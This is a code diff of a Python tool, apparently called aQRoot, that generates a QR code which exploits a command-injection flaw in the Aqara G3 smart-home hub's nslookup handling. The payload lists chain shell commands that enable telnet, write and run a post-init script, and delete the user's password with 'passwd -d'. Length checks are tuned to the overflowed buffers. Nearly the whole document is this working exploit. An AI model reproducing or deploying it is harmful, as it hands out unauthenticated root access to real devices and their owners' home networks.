@@ -4,7 +4,7 @@ import segno
 
 __title__ = "aQRoot"
 __desc__ = "Enable telnet via qrcode command injection for Aqara G3 hub"
-__version__ = "0.2.0"
+__version__ = "0.2"
 __author__ = "Gareth Bryan"
 __license__ = "MIT"
 
@@ -23,22 +23,21 @@ def cipher(data):
 
 def generate_payload(ssid, pwd, payload, post_init):
     """
-    overall qrcode buffer is char[1024]
-    nslookup sprintf buffer is char[132]
-    Do not exceed these.
+    qrcode buffer is [1024]
+    nslookup sprintf buffer [132]
     "nslookup domain;<payload>0x00"
     """
     payload.insert(0, 'a')
-    payload = {
+    qrcode_data = {
         "b": "\\n".join(post_init),
         "d": ";".join(payload),
         "x": cipher(ssid.encode()),
         "y": cipher(pwd.encode()),
         "l": "en",
     }
-    payload_string = "&".join([f"{k}={v}" for k, v in payload.items()])
-    if len(payload['d']) > 121:
-        raise ValueError(f"Payload (d) exceeds buffer {len(payload['d'])}/122")
+    payload_string = "&".join([f"{k}={v}" for k, v in qrcode_data.items()])
+    if len(qrcode_data['d']) > 121:
+        raise ValueError(f"Payload (d) exceeds buffer {len(qrcode_data['d'])}/122")
     if len(payload_string) > 1023:
         raise ValueError(f"Payload string exceeds qrcode buffer {len(payload_string)}/1024")
     return payload_string
@@ -57,15 +56,13 @@ def main(args):
             ssid=args.ssid,
             pwd=args.pwd,
             payload=[
-                'x="fw_man"ager.sh',
                 'y=/data/scripts/post_init.sh',
-                '$x -t -f',
-                'z=`agetprop persist.app.bind_key`',
-                'echo -e $z>$y',
-                'tail -n2 $y|sh'
+                '"fw_man"ager.sh -t -f',
+                'echo -e `agetprop persist.app.bind_key`>$y',
+                'tail -n2 $y|sh',
             ],
             post_init = [
-                '#\\x21/bin/sh',
+                '#!/bin/sh',
                 'fw_manager.sh -r',
                 'passwd -d $USER',
                 'fw_manager.sh -t -k'
